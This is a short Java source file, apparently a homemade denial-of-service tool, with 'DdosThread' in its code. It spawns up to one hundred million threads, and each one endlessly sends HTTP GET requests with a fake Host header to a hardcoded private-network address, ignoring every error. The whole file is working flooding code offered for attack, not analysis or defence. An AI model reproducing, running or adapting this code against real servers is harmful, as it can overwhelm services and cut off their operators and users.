package maerih;

import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.Scanner;

public class bigieeDOs {


    public static String Target="https://192.168.1.200:9090/";

    public static void main(String... args) throws Exception{
        System.out.println("Input Url to Dos:/n");
        Scanner scanner = new Scanner(System.in);
        for(int i=0; i<100000000;i++){
            System.out.println("Attacking thread("+i+") for " + Target);
            DdosThread thread = new DdosThread();
            thread.start();
        }
    }
    public static class DdosThread extends Thread{
        private AtomicBoolean running = new AtomicBoolean(true);
        private final String request = Target;
        private final URL url;

        String param = null;

        public DdosThread() throws Exception{
            url = new URL(request);
            param = "param1=" + URLEncoder.encode("857775", "UTF-8");
        }



         @Override
          public void run() {
             while (running.get()) {
                 try {
                     attack();
                 } catch (Exception e) {
                 }
             }
          }
          public void attack() throws Exception{
              HttpURLConnection connection = (HttpURLConnection) url.openConnection();
              connection.setDoOutput(true);
              connection.setDoInput(true);
              connection.setRequestMethod("GET");
              connection.setRequestProperty("charset", "UTF-8");
              connection.setRequestProperty("Host", "lajl");
              System.out.println(this + " " + connection.getResponseCode());
              connection.getInputStream();

          }

    }


}
